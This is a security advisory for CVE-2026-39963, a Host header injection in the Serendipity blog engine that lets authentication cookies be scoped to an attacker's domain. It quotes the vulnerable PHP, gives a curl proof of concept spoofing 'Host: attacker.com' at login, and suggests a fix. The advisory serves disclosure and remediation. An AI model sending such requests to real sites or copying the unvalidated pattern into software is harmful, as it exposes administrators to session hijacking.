# [M] Serendipity has a Host Header Injection allows authentication cookie scoping to attacker-controlled domain in functions_config.inc.php

## Summary
Severity: Medium
Advisory: GHSA-4m6c-649p-f6gf
CVE: CVE-2026-39963
CWE: CWE-565
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-4m6c-649p-f6gf
Type: github-advisory

## Affected
- Packagist: `s9y/serendipity` — affected >=0 <2.6.0

## Details
### Summary
The `serendipity_setCookie()` function uses `$_SERVER['HTTP_HOST']` without validation as the `domain` parameter of `setcookie()`. An attacker can force authentication cookies — including session tokens and auto-login tokens — to be scoped to an attacker-controlled domain, facilitating session hijacking.

### Details
In `include/functions_config.inc.php:726`:
```php
function serendipity_setCookie($name, $value, $securebyprot = true, ...) {
    $host = $_SERVER['HTTP_HOST']; // ← attacker-controlled, no validation

    if ($securebyprot) {
        if ($pos = strpos($host, ":")) {
            $host = substr($host, 0, $pos); // strips port only
        }
    }

    setcookie("serendipity[$name]", $value, [
        'domain'   => $host,   // ← poisoned domain
        'httponly' => $httpOnly,
        'samesite' => 'Strict'
    ]);
}
```

This function is called during login with sensitive cookies:
```php
// functions_config.inc.php:455-498
serendipity_setCookie('author_autologintoken', $rnd, true, false, true);
serendipity_setCookie('author_username', $user);
serendipity_setCookie('author_token', $hash);
```

If an attacker can influence the `Host` header at login time (e.g. via MITM, reverse proxy misconfiguration, or load balancer), authentication cookies are issued scoped to the attacker's domain instead of the legitimate one.

### PoC
```bash
curl -v -X POST \
  -H "Host: attacker.com" \
  -d "serendipity[user]=admin&serendipity[pass]=admin" \
  http://[TARGET]/serendipity_admin.php 2>&1 | grep -i "set-cookie"
```

Expected output:
```http
Set-Cookie: serendipity[author_token]=; domain=attacker.com; HttpOnly
```

### Impact
- **Session fixation** — attacker pre-sets a cookie scoped to their domain, then tricks the victim into authenticating, inheriting the poisoned token
- **Token leakage** — `author_autologintoken` scoped to wrong domain may be sent to attacker-controlled infrastructure
- **Privilege escalation** — if admin logs in under a poisoned Host header, their admin token is compromised

### Suggested Fix
Validate `HTTP_HOST` against the configured `$serendipity['url']` before use:
```php
function serendipity_setCookie($name, $value, ...) {
    global $serendipity;
    $configured = parse_url($serendipity['url'], PHP_URL_HOST);
    $host = preg_replace('/:[0-9]+$/', '', $_SERVER['HTTP_HOST']);
    $host = ($host === $configured) ? $host : $configured;

    setcookie("serendipity[$name]", $value, [
        'domain' => $host,
        ...
    ]);
}
```

## References
- https://github.com/s9y/Serendipity/security/advisories/GHSA-4m6c-649p-f6gf
- https://nvd.nist.gov/vuln/detail/CVE-2026-39963
- https://github.com/s9y/Serendipity
- https://github.com/s9y/Serendipity/releases/tag/2.6.0
